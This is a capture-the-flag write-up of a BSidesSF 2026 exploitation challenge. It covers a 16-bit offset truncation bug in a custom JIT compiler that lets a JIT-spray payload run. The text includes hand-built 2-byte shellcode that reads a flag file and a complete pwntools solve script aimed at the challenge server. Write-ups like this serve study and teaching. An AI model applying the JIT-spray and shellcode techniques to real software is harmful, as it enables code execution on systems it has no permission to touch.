# rugdoctor — PWN

**CTF**: BSidesSF 2026
**Points**: 1000
**Flag**: `CTF{executing-through-the-cracks-of-society}`

---

## TL;DR

Custom JIT compiler with RWX code pages. The `if`/`endif` offset calculation uses `movzwl` (16-bit truncation) for the `je rel32` offset. When JIT code exceeds 65536 bytes, the offset wraps and the `je` jumps backward into shellcode hidden in `mul` instruction immediates via classic JIT spray (EB 03 technique). Shellcode built entirely from 2-byte instructions constructs `/home/ctf/flag.txt` on the stack using `mov al/ah + push ax`, then does `open → read → write(stdout)`.

---

## Binary

```
rugdoctor: ELF 64-bit LSB PIE, x86-64, dynamically linked, stripped
```

### JIT Language

| Instruction | Description | JIT encoding |
|---|---|---|
| `let $a N` | r12 = N | `41 bc XX XX XX XX` (6 bytes) |
| `add $a N` | r12 += N | `49 81 c4 XX XX XX XX` (7 bytes) |
| `mul $a N` | r12 *= N | `4d 69 e4 XX XX XX XX` (7 bytes) |
| `print $a` | printf("%d\n", r12) | `movabs rdi,fmt; mov rsi,r12; movabs rax,printf; call rax` |
| `if $a` | if (r12 != 0) | `test r12,r12; je rel32` (9 bytes) |
| `endif` | end if block | patches the je placeholder |
| `exit N` | exit(N) | `mov edi,N; movabs rax,exit; call rax` |

Variables: `$a`=r12, `$b`=r13, `$c`=r14, `$d`=r15. JIT code mapped RWX via `mmap(PROT_READ|PROT_WRITE|PROT_EXEC)`.

### Sandbox

Before jumping to JIT code, all registers except `rax` (JIT buffer address) are zeroed:
```asm
xor rbx,rbx; xor rcx,rcx; xor rdx,rdx; xor rsi,rsi; xor rdi,rdi; xor rbp,rbp
jmp *rax
```
First JIT instruction is always `xor rax,rax` — losing the buffer address.

---

## Vulnerability: 16-bit Offset Truncation in if/endif (CWE-190)

The `endif` handler patches the `je rel32` placeholder from the corresponding `if`:

```asm
; endif handler at 0x267b
mov    eax, [rbp-0x28]        ; current_offset (32-bit)
movzwl %ax, %edx              ; ← TRUNCATE to 16 bits!
...
mov    -0xe4(%rbp,...), %eax  ; saved_offset from if_stack (32-bit)
movzwl %ax, %eax              ; ← TRUNCATE to 16 bits!
sub    %eax, %edx             ; current_16 - saved_16
lea    %eax, [rdx-4]          ; - 4 (je offset adjustment)
```

Both `current_offset` and `saved_offset` are truncated to 16 bits via `movzwl`. The patch address uses the full 32-bit `saved_offset`, so the write goes to the correct location. But the **offset value** wraps at 65536.

### Exploitation

When the `if` body crosses a 65536-byte boundary:

```
saved_offset % 65536 > current_offset % 65536
→ subtraction produces a NEGATIVE result
→ je jumps BACKWARD
```

**Target calculation:**

```
je_target = (saved_offset + 4) + offset_value
         = saved_offset + 4 + (current%65536 - saved%65536 - 4)
         = saved_offset + (current % 65536) - (saved % 65536)
```

If `saved < 65536` (if statement near the start):
```
je_target = (current % 65536)
```

By choosing the if-body size so that `current % 65536 = shellcode_offset`, the `je` jumps directly to our shellcode.

---

## JIT Spray: EB 03 Technique

Each `mul $a VAL` generates 7 bytes: `4d 69 e4 [XX XX XX XX]`

The 4-byte immediate is fully controlled. When execution enters at offset +3 (the immediate), the pattern is:

```
[sc_byte0][sc_byte1][EB 03]  ←  2 bytes shellcode + jmp +3
[4d 69 e4]                    ←  3 bytes overhead (skipped)
[sc_byte2][sc_byte3][EB 03]  ←  next 2 bytes + jmp +3
[4d 69 e4]                    ←  skipped
...
```

**2 useful bytes per 7-byte `mul` instruction.** The `EB 03` (jmp +3) skips the 3-byte overhead of the next mul's opcode.

### Constraint: 2-Byte Instructions Only

Each JIT spray slot provides exactly 2 bytes. All shellcode instructions must be ≤ 2 bytes, or be composed of two 1-byte instructions.

---

## Shellcode: 2-Byte Instruction Only

### Building the Path String on Stack

The string `/home/ctf/flag.txt\0` is constructed using `mov al, X; mov ah, Y; push ax` (each 2 bytes):

```
push ax (66 50) pushes 2 bytes: al at [rsp], ah at [rsp+1]
```

Push pairs in reverse order (stack grows down, last push = lowest address = string start):

| Push order | al | ah | Memory bytes |
|---|---|---|---|
| 1st | 0x00 | 0x00 | `\0\0` (null terminator) |
| 2nd | 0x78 | 0x74 | `xt` |
| 3rd | 0x2e | 0x74 | `.t` |
| 4th | 0x61 | 0x67 | `ag` |
| 5th | 0x66 | 0x6c | `fl` |
| 6th | 0x66 | 0x2f | `f/` |
| 7th | 0x63 | 0x74 | `ct` |
| 8th | 0x65 | 0x2f | `e/` |
| 9th | 0x6f | 0x6d | `om` |
| 10th | 0x2f | 0x68 | `/h` |

Result at rsp: `/home/ctf/flag.txt\0\0`

### Syscalls

All using 2-byte instruction pairs:

```asm
; rdi = rsp (path pointer)
push rsp; pop rdi         ; 54 5f

; open(rdi, 0, 0)
xor edx, edx              ; 31 d2
xor esi, esi              ; 31 f6
push 2; pop rax           ; 6a 02 / 58 90
syscall                   ; 0f 05

; read(fd, rsp, 256)
push rax; pop rdi          ; 50 5f  (fd from open return)
push rsp; pop rsi          ; 54 5e
xor edx, edx; mov dh, 1   ; 31 d2 / b6 01  (rdx = 256)
xor eax, eax               ; 31 c0  (SYS_read = 0)
syscall                    ; 0f 05

; write(1, rsp, 256)
push 1; pop rdi            ; 6a 01 / 5f 90
push rsp; pop rsi          ; 54 5e
xor edx, edx; mov dh, 1   ; 31 d2 / b6 01
push 1; pop rax            ; 6a 01 / 58 90
syscall                    ; 0f 05

; exit(0)
xor edi, edi               ; 31 ff
push 60; pop rax           ; 6a 3c / 58 90
syscall                    ; 0f 05
```

---

## Exploit Structure

```
let $b 0                    ← r13 = 0 (if condition: always jump)
let $a 1                    ← r12 = 1 (mul operand)
mul $a <chunk0>             ← shellcode pair 0 + EB 03
mul $a <chunk1>             ← shellcode pair 1 + EB 03
...                         ← (55 mul instructions total)
if $b                       ← test r13; je <placeholder>
add $a 1 × ~9300           ← padding to cross 65536-byte boundary
[letv/let for remainder]    ← alignment adjustment
endif                       ← patches je with NEGATIVE offset → jumps to mul immediates!
exit 0                      ← safety net (never reached)
```

### Offset Calculation

- Shellcode entry: JIT offset **18** (offset +3 of first `mul` immediate)
- `if` at offset ~400, `saved_offset` ~405
- Padding: chosen so `endif_offset % 65536 = 18`
- Result: `je` offset = `18 - (saved % 65536) - 4` = **negative** → backward jump to offset 18

---

## Solve Script

```python
from pwn import *
import struct

context.arch = 'amd64'

# Path pairs: (al, ah) for push ax
pairs = [
    (0x00,0x00), (0x78,0x74), (0x2e,0x74), (0x61,0x67), (0x66,0x6c),
    (0x66,0x2f), (0x63,0x74), (0x65,0x2f), (0x6f,0x6d), (0x2f,0x68),
]

sc_pairs = [b'\x31\xc0']  # xor eax,eax
for al_v, ah_v in pairs:
    sc_pairs += [bytes([0xb0,al_v]), bytes([0xb4,ah_v]), b'\x66\x50']
sc_pairs += [
    b'\x54\x5f', b'\x31\xd2', b'\x31\xf6', b'\x6a\x02', b'\x58\x90', b'\x0f\x05',  # open
    b'\x50\x5f', b'\x54\x5e', b'\x31\xd2', b'\xb6\x01', b'\x31\xc0', b'\x0f\x05',  # read
    b'\x6a\x01', b'\x5f\x90', b'\x54\x5e', b'\x31\xd2', b'\xb6\x01',
    b'\x6a\x01', b'\x58\x90', b'\x0f\x05',  # write
    b'\x31\xff', b'\x6a\x3c', b'\x58\x90', b'\x0f\x05',  # exit
]

chunks = [struct.unpack('<I', p + b'\xeb\x03')[0] for p in sc_pairs]

lines = ['let $b 0', 'let $a 1']
for v in chunks: lines.append(f'mul $a {v}')

if_off = 15 + len(chunks) * 7
body = (18 - if_off - 9) % 65536  # pad to make endif % 65536 == 18
lines.append('if $b')
for _ in range(body // 7): lines.append('add $a 1')
rem = body % 7
if rem == 3: lines.append('letv $c $a')
elif rem == 6: lines.append('let $c 0')
lines += ['endif', 'exit 0']

io = remote('rugdoctor-f61acdb4.challenges.bsidessf.net', 9898)
io.recvuntil(b'ctrl-d'); io.recvline()
io.send('\n'.join(lines).encode() + b'\n')
io.shutdown('send')
io.recvuntil(b'--------'); io.recvline()
print(io.recvall(timeout=15))
```

---

## Flag

```
CTF{executing-through-the-cracks-of-society}
```

---

## Key Lessons

1. **Integer truncation in JIT compilers is catastrophic.** The `movzwl` (16-bit truncation) of a 32-bit offset creates a modular arithmetic bug that allows arbitrary backward jumps when code exceeds 65536 bytes.

2. **RWX JIT pages are inherently dangerous.** Even with register sanitization, the ability to control instruction immediates and redirect execution via compiler bugs enables shellcode injection.

3. **JIT spray with EB 03** is a classic technique: 2 bytes of shellcode per 7-byte JIT instruction slot, with `jmp +3` skipping the inter-instruction overhead.

4. **2-byte shellcode is practical.** Using `mov al/ah` + `push ax` to build strings, and `push imm8; pop reg` for register setup, complex shellcode (open+read+write) fits within the 2-byte-per-slot constraint.

5. **The 16-bit wrap requires ~65KB of JIT code** (~9300 `add` instructions), which the compiler allows via `mremap` growth. The "pretty big limit" message hints at this being intentional.
